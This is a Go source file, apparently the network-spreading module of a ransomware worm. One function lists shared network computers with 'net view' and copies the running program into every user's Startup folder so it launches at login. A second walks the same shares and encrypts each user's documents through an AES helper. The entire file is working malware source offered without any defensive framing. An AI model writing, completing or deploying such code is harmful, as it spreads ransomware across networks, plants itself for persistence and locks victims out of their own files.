package spread

import "regexp"
import "strings"
import "os"
import "../aes"
import "../utils"

var SharedPCs []string

func Spread() {
	netPcs := utils.Run("net view")
	//Parse
	re := regexp.MustCompile(`\\\\.*\b`)
	for _, match := range re.FindAllString(netPcs, -1) {
		SharedPCs = append(SharedPCs, match)
	}
	//For PC in SharedPCs, get users
	for _, SharedPC := range SharedPCs {
		out := utils.Run("dir /B /A " + SharedPC + "\\Users")
		users := strings.Split(out, "\r\n")
		//Copy to run
		for _, user := range users {
			utils.Run("copy " + os.Args[0] + " /Y /Z /V " + SharedPC + "\\Users\\" + user +
				"\\Appdata\\Roaming\\Microsoft\\Windows\\" + `"Start Menu"` + "\\Programs\\Startup")
		}
	}
}
func SpreadEncrypt(mode bool) {
	netPcs := utils.Run("net view")
	//Parse
	re := regexp.MustCompile(`\\\\.*\b`)
	for _, match := range re.FindAllString(netPcs, -1) {
		SharedPCs = append(SharedPCs, match)
	}
	//For PC in SharedPCs, get users
	for _, SharedPC := range SharedPCs {
		out := utils.Run("dir /B /A " + SharedPC + "\\Users")
		users := strings.Split(out, "\r\n")
		//Copy to run
		for _, user := range users {
			aes.EncryptDocumets(SharedPC+"\\Users\\"+user+"\\", mode)
		}
	}
}
